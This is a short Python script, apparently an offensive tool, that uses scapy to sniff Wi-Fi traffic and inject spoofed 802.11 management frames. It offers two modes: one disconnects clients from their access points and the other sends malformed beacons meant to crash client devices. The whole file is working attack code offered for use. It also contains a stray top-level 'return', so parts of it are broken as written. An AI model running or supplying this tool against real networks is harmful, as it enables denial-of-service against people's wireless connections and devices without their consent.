from scapy.all import *
r,t=random,time

#tool start
print('set interface to:')
a=input('')
mon=a
#-------------------

R=RadioTap()
def crash_proc(p):
	if p.haslayer(Dot11):
		if p.type == 2 and p.subtype in {4,8,12}:
			print(f'<info> send malformed Beacon from AP {p.addr3} to CLIENT {p.addr2}')
			sendp(R/Dot11(type=[0,1],subtype=8,addr1=p.addr2,addr2=p.addr3,addr3=p.addr3),iface=mon,count=1,verbose=0)

def kick_proc(p):
	if p.haslayer(Dot11):
		if p.type == 2 and p.subtype in {4,8,12}:
			print(f'<info> disconnected CLIENT {p.addr2} from AP {p.addr3} # Broadcast {p.addr1}')
			sendp(R/Dot11(type=0,subtype=[0,10,12],addr1=p.addr1,addr2=p.addr2,addr3=p.addr3)/Raw(load=b'\x04'*r.randint(8,32)),iface=mon,count=1,verbose=0)

#tool select
print('select attack mode:')
print('0 AUTOKICK CLIENTS | 1 CRASH CLIENTS')
pgo=input('')

if len(pgo) <= 0:
	print('nothing selected')
	return

print('<INTERFACE> scanning WIFI Access Points..')
if pgo == '0':
	sniff(iface=mon,prn=kick_proc)
elif pgo == '1':
	sniff(iface=mon,prn=crash_proc)
